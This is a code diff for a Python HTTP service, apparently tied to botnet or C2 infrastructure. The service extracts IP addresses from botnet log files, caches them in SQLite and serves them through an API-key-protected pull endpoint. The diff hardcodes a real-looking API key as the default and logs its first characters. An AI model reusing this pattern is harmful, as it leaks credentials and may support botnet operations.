@@ -13,6 +13,7 @@ import os
 import re
 import sys
 import time
+import sqlite3
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import List, Dict, Optional, Tuple
@@ -63,13 +64,15 @@ LOG_DIR = Path(CONFIG["botnet"]["log_dir"])
 LOG_FILE_PATTERN = CONFIG["botnet"]["log_file_pattern"]
 
 # HTTP服务器配置
-HTTP_HOST = os.environ.get("C2_HTTP_HOST", "0.0.0.0")
-HTTP_PORT = int(os.environ.get("C2_HTTP_PORT", "8888"))
-API_KEY = os.environ.get("C2_API_KEY", "your-secret-api-key-here")
+HTTP_HOST = os.environ.get("C2_HTTP_HOST", CONFIG.get("http_server", {}).get("host", "0.0.0.0"))
+HTTP_PORT = int(os.environ.get("C2_HTTP_PORT", CONFIG.get("http_server", {}).get("port", 8888)))
+# 优先从环境变量读取，其次从config.json，最后使用默认值
+API_KEY = os.environ.get("C2_API_KEY", CONFIG.get("http_server", {}).get("api_key", "KiypG4zWLXqnREqGPH8L2Oh9ybvi6Yh4"))
 
-# 数据缓存配置
+# 数据缓存配置（改用SQLite持久化）
 MAX_CACHED_RECORDS = 10000
-CACHE_FILE = "/tmp/c2_data_cache.json"
+CACHE_DB_FILE = "/tmp/c2_data_cache.db"  # SQLite数据库文件
+CACHE_RETENTION_DAYS = 7  # 已拉取数据保留7天后自动清理
 
 # IP解析正则
 IP_REGEX = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
@@ -230,78 +233,243 @@ class IPProcessor:
 # ============================================================
 
 class DataCache:
-    """数据缓存管理器"""
+    """数据缓存管理器 - 使用SQLite持久化存储"""
     
-    def __init__(self, cache_file: str = CACHE_FILE):
-        self.cache_file = cache_file
-        self.records: List[Dict] = []
+    def __init__(self, db_file: str = CACHE_DB_FILE):
+        self.db_file = db_file
+        self.conn = None
         self.total_generated = 0
         self.total_pulled = 0
-        self.load_cache()
+        self.init_database()
+        self.load_stats()
     
-    def load_cache(self):
-        """加载缓存"""
+    def init_database(self):
+        """初始化SQLite数据库"""
         try:
-            if os.path.exists(self.cache_file):
-                with open(self.cache_file, 'r') as f:
-                    data = json.load(f)
-                    self.records = data.get('records', [])
-                    self.total_generated = data.get('total_generated', 0)
-                    self.total_pulled = data.get('total_pulled', 0)
-                logger.info(f"加载缓存: {len(self.records)} 条待拉取记录")
+            self.conn = sqlite3.connect(self.db_file, check_same_thread=False)
+            self.conn.row_factory = sqlite3.Row
+            
+            # 创建表结构
+            self.conn.execute('''
+                CREATE TABLE IF NOT EXISTS cache (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    ip TEXT NOT NULL,
+                    timestamp TEXT NOT NULL,
+                    data TEXT NOT NULL,
+                    pulled INTEGER DEFAULT 0,
+                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+                    pulled_at TEXT,
+                    UNIQUE(ip, timestamp)
+                )
+            ''')
+            
+            # 创建索引以提高查询性能
+            self.conn.execute('CREATE INDEX IF NOT EXISTS idx_pulled ON cache(pulled)')
+            self.conn.execute('CREATE INDEX IF NOT EXISTS idx_created_at ON cache(created_at)')
+            self.conn.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON cache(timestamp)')
+            
+            # 创建统计表
+            self.conn.execute('''
+                CREATE TABLE IF NOT EXISTS stats (
+                    id INTEGER PRIMARY KEY CHECK (id = 1),
+                    total_generated INTEGER DEFAULT 0,
+                    total_pulled INTEGER DEFAULT 0,
+                    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+            
+            # 初始化统计
+            self.conn.execute('INSERT OR IGNORE INTO stats (id, total_generated, total_pulled) VALUES (1, 0, 0)')
+            self.conn.commit()
+            
+            logger.info(f"SQLite数据库初始化成功: {self.db_file}")
         except Exception as e:
-            logger.error(f"加载缓存失败: {e}")
+            logger.error(f"SQLite数据库初始化失败: {e}")
+            raise
     
-    def save_cache(self):
-        """保存缓存"""
+    def load_stats(self):
+        """加载统计数据"""
         try:
-            data = {
-                'updated_at': datetime.now().isoformat(),
-                'total_generated': self.total_generated,
-                'total_pulled': self.total_pulled,
-                'records': self.records
-            }
-            temp_file = self.cache_file + ".tmp"
-            with open(temp_file, 'w') as f:
-                json.dump(data, f, indent=2)
-            os.replace(temp_file, self.cache_file)
+            cursor = self.conn.execute('SELECT * FROM stats WHERE id = 1')
+            row = cursor.fetchone()
+            if row:
+                self.total_generated = row['total_generated']
+                self.total_pulled = row['total_pulled']
+            
+            # 统计未拉取的记录数
+            cursor = self.conn.execute('SELECT COUNT(*) as count FROM cache WHERE pulled = 0')
+            unpulled_count = cursor.fetchone()['count']
+            
+            logger.info(f"加载缓存: {unpulled_count} 条未拉取记录")
         except Exception as e:
-            logger.error(f"保存缓存失败: {e}")
+            logger.error(f"加载统计数据失败: {e}")
+    
+    def save_stats(self):
+        """保存统计数据"""
+        try:
+            self.conn.execute('''
+                UPDATE stats SET 
+                    total_generated = ?,
+                    total_pulled = ?,
+                    updated_at = CURRENT_TIMESTAMP
+                WHERE id = 1
+            ''', (self.total_generated, self.total_pulled))
+            self.conn.commit()
+        except Exception as e:
+            logger.error(f"保存统计数据失败: {e}")
     
     def add_records(self, records: List[Dict]):
-        """添加新记录"""
-        self.records.extend(records)
-        self.total_generated += len(records)
-        
-        # 限制缓存大小
-        if len(self.records) > MAX_CACHED_RECORDS:
-            self.records = self.records[-MAX_CACHED_RECORDS:]
-            logger.warning(f"缓存已满，保留最新的 {MAX_CACHED_RECORDS} 条")
+        """添加新记录（使用批量插入）"""
+        try:
+            added_count = 0
+            for record in records:
+                try:
+                    self.conn.execute('''
+                        INSERT INTO cache (ip, timestamp, data, pulled)
+                        VALUES (?, ?, ?, 0)
+                    ''', (record['ip'], record['timestamp'], json.dumps(record)))
+                    added_count += 1
+                except sqlite3.IntegrityError:
+                    # 重复记录，跳过
+                    pass
+            
+            self.conn.commit()
+            self.total_generated += added_count
+            self.save_stats()
+            
+            # 检查是否超过最大缓存，如果超过则警告
+            cursor = self.conn.execute('SELECT COUNT(*) as count FROM cache WHERE pulled = 0')
+            unpulled_count = cursor.fetchone()['count']
+            if unpulled_count > MAX_CACHED_RECORDS:
+                logger.warning(f"缓存已超限：{unpulled_count} 条，请尽快拉取")
+            
+        except Exception as e:
+            logger.error(f"添加记录失败: {e}")
+            self.conn.rollback()
     
-    def get_records(self, count: int = 1000) -> List[Dict]:
-        """获取记录"""
-        if not self.records:
-            return []
+    def get_records(self, count: int = 1000, since: Optional[str] = None) -> List[Dict]:
+        """
+        获取未拉取的记录
         
-        result = self.records[:count]
-        return result
+        Args:
+            count: 最大返回数量
+            since: 只返回此时间之后的记录（ISO格式）
+        
+        Returns:
+            记录列表
+        """
+        try:
+            if since:
+                cursor = self.conn.execute('''
+                    SELECT id, data FROM cache 
+                    WHERE pulled = 0 AND timestamp > ?
+                    ORDER BY created_at ASC
+                    LIMIT ?
+                ''', (since, count))
+            else:
+                cursor = self.conn.execute('''
+                    SELECT id, data FROM cache 
+                    WHERE pulled = 0
+                    ORDER BY created_at ASC
+                    LIMIT ?
+                ''', (count,))
+            
+            rows = cursor.fetchall()
+            records = []
+            for row in rows:
+                data = json.loads(row['data'])
+                data['_cache_id'] = row['id']  # 附加缓存ID用于确认
+                records.append(data)
+            
+            return records
+        except Exception as e:
+            logger.error(f"获取记录失败: {e}")
+            return []
     
     def confirm_pulled(self, count: int):
-        """确认已拉取"""
-        if count > 0:
-            self.records = self.records[count:]
-            self.total_pulled += count
-            logger.info(f"确认拉取 {count} 条，剩余: {len(self.records)} 条")
-            self.save_cache()
+        """
+        确认已拉取（标记为已拉取，不立即删除）
+        
+        Args:
+            count: 确认的记录数量
+        """
+        try:
+            if count > 0:
+                # 标记为已拉取
+                self.conn.execute('''
+                    UPDATE cache SET 
+                        pulled = 1,
+                        pulled_at = CURRENT_TIMESTAMP
+                    WHERE id IN (
+                        SELECT id FROM cache WHERE pulled = 0 
+                        ORDER BY created_at ASC 
+                        LIMIT ?
+                    )
+                ''', (count,))
+                self.conn.commit()
+                
+                self.total_pulled += count
+                self.save_stats()
+                
+                # 统计剩余未拉取记录
+                cursor = self.conn.execute('SELECT COUNT(*) as count FROM cache WHERE pulled = 0')
+                unpulled_count = cursor.fetchone()['count']
+                
+                logger.info(f"确认拉取 {count} 条，剩余: {unpulled_count} 条")
+                
+                # 清理旧的已拉取记录（保留7天）
+                self.cleanup_old_records()
+        except Exception as e:
+            logger.error(f"确认拉取失败: {e}")
+            self.conn.rollback()
+    
+    def cleanup_old_records(self):
+        """清理过期的已拉取记录"""
+        try:
+            cursor = self.conn.execute('''
+                DELETE FROM cache 
+                WHERE pulled = 1 
+                AND pulled_at < datetime('now', '-' || ? || ' days')
+            ''', (CACHE_RETENTION_DAYS,))
+            
+            deleted_count = cursor.rowcount
+            if deleted_count > 0:
+                self.conn.commit()
+                logger.info(f"清理了 {deleted_count} 条过期记录")
+        except Exception as e:
+            logger.error(f"清理过期记录失败: {e}")
     
     def get_stats(self) -> Dict:
         """获取统计信息"""
-        return {
-            'cached_records': len(self.records),
-            'total_generated': self.total_generated,
-            'total_pulled': self.total_pulled,
-            'cache_full': len(self.records) >= MAX_CACHED_RECORDS
-        }
+        try:
+            cursor = self.conn.execute('SELECT COUNT(*) as count FROM cache WHERE pulled = 0')
+            cached_records = cursor.fetchone()['count']
+            
+            cursor = self.conn.execute('SELECT COUNT(*) as count FROM cache WHERE pulled = 1')
+            pulled_records = cursor.fetchone()['count']
+            
+            return {
+                'cached_records': cached_records,
+                'pulled_records': pulled_records,
+                'total_generated': self.total_generated,
+                'total_pulled': self.total_pulled,
+                'cache_full': cached_records >= MAX_CACHED_RECORDS
+            }
+        except Exception as e:
+            logger.error(f"获取统计信息失败: {e}")
+            return {
+                'cached_records': 0,
+                'pulled_records': 0,
+                'total_generated': self.total_generated,
+                'total_pulled': self.total_pulled,
+                'cache_full': False
+            }
+    
+    def close(self):
+        """关闭数据库连接"""
+        if self.conn:
+            self.conn.close()
+            logger.info("数据库连接已关闭")
 
 
 # 全局数据缓存
@@ -385,7 +553,7 @@ class BackgroundLogReader:
                             if len(new_records) >= 5000:
                                 break
                         
-                        logger.info(f"  ✓ 文件处理完成: 读取{line_count}行，提取{ip_count}个IP")
+                        logger.info(f"  文件处理完成: 读取{line_count}行，提取{ip_count}个IP")
                     
                     self.processed_files.add(file_key)
                     files_read += 1
@@ -399,8 +567,9 @@ class BackgroundLogReader:
             
             if new_records:
                 self.cache.add_records(new_records)
-                self.cache.save_cache()
-                logger.info(f"✅ 新增 {len(new_records)} 条记录，当前缓存: {len(self.cache.records)} 条")
+                # SQLite 自动持久化，无需手动保存
+                stats = self.cache.get_stats()
+                logger.info(f"新增 {len(new_records)} 条记录，当前缓存: {stats['cached_records']} 条")
             
             # 清理已处理文件列表
             if len(self.processed_files) > 100:
@@ -428,34 +597,53 @@ def check_auth(request: web.Request) -> bool:
     
     if auth_header.startswith('Bearer '):
         token = auth_header[7:]
-        return token == API_KEY
+        result = token == API_KEY
+        if not result:
+            logger.warning(f"认证失败 (Bearer): 收到 {token[:6]}***, 期望 {API_KEY[:6]}***")
+        return result
     
     api_key = request.headers.get('X-API-Key', '')
-    return api_key == API_KEY
+    result = api_key == API_KEY
+    if not result:
+        logger.warning(f"认证失败 (X-API-Key): 收到 '{api_key[:6] if api_key else '(空)'}***', 期望 '{API_KEY[:6]}***'")
+        logger.warning(f"收到Key长度: {len(api_key)}, 期望长度: {len(API_KEY)}")
+    return result
 
 
 async def handle_pull(request: web.Request) -> web.Response:
-    """处理数据拉取请求"""
+    """
+    处理数据拉取请求
+    
+    支持参数：
+    - limit: 最大拉取数量（默认1000）
+    - since: 只拉取此时间之后的数据（断点续传）
+    - confirm: 是否自动确认删除（默认false，不建议使用true）
+    """
     if not check_auth(request):
         return web.json_response({'error': 'Unauthorized'}, status=401)
     
     try:
         params = request.rel_url.query
+        
         # 支持 limit 和 count 参数（兼容性）
         limit = int(params.get('limit', params.get('count', 1000)))
         limit = min(limit, 5000)  # 限制最大拉取数量
         
-        # 支持 confirm 参数（拉取后自动确认删除）
-        auto_confirm = params.get('confirm', '').lower() == 'true'
+        # 支持 since 参数（断点续传）
+        since = params.get('since', None)
         
-        records = data_cache.get_records(limit)
+        # 支持 confirm 参数（默认false，推荐使用两阶段确认）
+        auto_confirm = params.get('confirm', 'false').lower() == 'true'
         
-        # 如果启用了自动确认，拉取后立即删除
+        # 拉取记录
+        records = data_cache.get_records(limit, since)
+        
+        # 如果启用了自动确认（不推荐）
         if auto_confirm and records:
             data_cache.confirm_pulled(len(records))
-            logger.info(f"拉取请求: 返回并确认 {len(records)} 条记录")
+            logger.info(f"拉取请求: 返回并确认 {len(records)} 条记录（自动确认模式）")
         else:
-            logger.info(f"拉取请求: 返回 {len(records)} 条记录（未确认）")
+            logger.info(f"拉取请求: 返回 {len(records)} 条记录（未确认，等待服务器确认）")
         
         response_data = {
             'success': True,
@@ -554,10 +742,13 @@ def main():
     logger.info(f"HTTP服务: http://{HTTP_HOST}:{HTTP_PORT}")
     logger.info(f"日志目录: {LOG_DIR}")
     logger.info(f"僵尸网络类型: {BOTNET_TYPE}")
+    logger.info(f"API Key长度: {len(API_KEY)}, 前6位: {API_KEY[:6]}***")
     logger.info("="*60)
     
     if API_KEY == "your-secret-api-key-here":
         logger.warning("⚠️  警告: 使用默认API Key，请设置环境变量 C2_API_KEY")
+    elif API_KEY == "KiypG4zWLXqnREqGPH8L2Oh9ybvi6Yh4":
+        logger.info("API Key已正确配置")
     
     app = create_app()
     web.run_app(app, host=HTTP_HOST, port=HTTP_PORT)
